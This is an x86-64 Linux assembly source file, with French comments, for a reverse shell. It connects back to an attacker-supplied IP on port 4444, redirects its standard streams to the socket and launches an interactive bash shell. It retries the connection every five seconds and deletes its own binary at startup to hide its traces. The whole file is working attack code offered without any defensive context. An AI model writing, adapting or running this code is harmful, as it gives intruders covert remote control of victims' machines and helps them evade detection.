section .data
    command      db '/bin/bash',0
    port_str     db '4444',0
    
    ; Arguments pour execve
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    
    ; Messages d'erreur
    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format db 'Error: Invalid IP format',10,0
    err_socket   db 'Error: Socket creation failed',10,0
    err_connect  db 'Error: Connection failed',10,0
    timespec     dq 5, 0          ; 5 secondes entre les tentatives
    
    ; Chemins système
    self_path    db '/proc/self/exe',0
    term_env     db 'TERM=xterm',0
    env_vars     dq term_env, 0

section .bss
    ip_bytes    resd 1  ; IP en format réseau
    port_bytes  resw 1  ; Port en format réseau
    self_exe    resb 256

section .text
    global _start

;----------------------------------------------------------
; Auto-suppression silencieuse
;----------------------------------------------------------
self_destruct:
    ; Lire le chemin de l'exécutable
    mov rax, 89        ; sys_readlink
    mov rdi, self_path
    mov rsi, self_exe
    mov rdx, 256
    syscall
    
    ; Ignorer les erreurs de lecture
    test rax, rax
    js .finish
    
    ; Ajouter le NULL terminal
    mov rdi, self_exe
    add rdi, rax
    mov byte [rdi], 0
    
    ; Supprimer l'exécutable
    mov rax, 87        ; sys_unlink
    mov rdi, self_exe
    syscall

.finish:
    ret

;----------------------------------------------------------
; Validation et conversion de l'IP
; Entrée : rdi = pointeur vers la chaîne IP
; Sortie : rax = 1 (succès), 0 (erreur)
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rsi, rdi
    xor rbx, rbx
    xor r12d, r12d
    xor eax, eax

.parse_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .end_parse
    
    cmp dl, '.'
    je .store_octet
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul eax, 10
    add eax, edx
    cmp eax, 255
    ja .invalid
    
    inc rsi
    jmp .parse_loop

.store_octet:
    cmp bl, 3
    jae .invalid
    
    shl r12d, 8
    or r12d, eax
    inc bl
    xor eax, eax
    inc rsi
    jmp .parse_loop

.end_parse:
    cmp bl, 3
    jne .invalid
    
    shl r12d, 8
    or r12d, eax
    bswap r12d
    mov [ip_bytes], r12d
    mov rax, 1
    jmp .done

.invalid:
    xor rax, rax

.done:
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Validation et conversion du port (fixé à 4444)
;----------------------------------------------------------
validate_port:
    mov rsi, port_str
    xor rax, rax
    xor rcx, rcx

.convert_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .check_value
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul rax, 10
    add rax, rdx
    cmp rax, 65535
    ja .invalid
    
    inc rsi
    inc rcx
    jmp .convert_loop

.check_value:
    test rcx, rcx
    jz .invalid
    
    xchg al, ah
    mov [port_bytes], ax
    mov rax, 1
    ret

.invalid:
    xor rax, rax
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    ; Auto-suppression silencieuse dès le démarrage
    call self_destruct
    
    ; Récupération des arguments
    pop rcx
    pop rsi
    
    ; Vérifier nombre d'arguments
    cmp rcx, 2
    jne usage_error
    
    ; Récupérer l'adresse IP
    pop rdi
    call validate_and_parse_ip
    test rax, rax
    jz ip_error
    
    ; Valider le port
    call validate_port
    test rax, rax
    jz port_error

connection_loop:
    ; Création du socket
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    
    test rax, rax
    js socket_error
    mov r8, rax         ; Sauvegarder le socket

    ; Préparation de la structure d'adresse
    sub rsp, 16
    mov word [rsp], 2
    mov ax, [port_bytes]
    mov word [rsp+2], ax
    mov eax, [ip_bytes]
    mov dword [rsp+4], eax
    mov qword [rsp+8], 0

    ; Connexion
    mov rax, 42
    mov rdi, r8
    mov rsi, rsp
    mov rdx, 16
    syscall
    
    add rsp, 16
    test rax, rax
    js connect_error

    ; Redirection des flux standard
    xor rsi, rsi
dup_loop:
    mov rax, 33
    mov rdi, r8
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop

    ; Lancement du shell interactif
    mov rax, 59         ; sys_execve
    lea rdi, [command]  ; Chemin du programme
    lea rsi, [bash_args] ; Arguments
    lea rdx, [env_vars]  ; Environnement
    syscall

    ; Si execve échoue, on quitte
    jmp exit_program

usage_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_usage]
    mov rdx, 30
    syscall
    mov rdi, 1
    jmp exit_program

ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    mov rdi, 1
    jmp exit_program

port_error:
    mov rdi, 1
    jmp exit_program

socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    mov rdi, 1
    jmp exit_program

connect_error:
    mov rax, 3          ; sys_close
    mov rdi, r8
    syscall
    
    ; Attendre avant de réessayer
    mov rax, 35
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    
    jmp connection_loop

exit_program:
    mov rax, 60
    syscall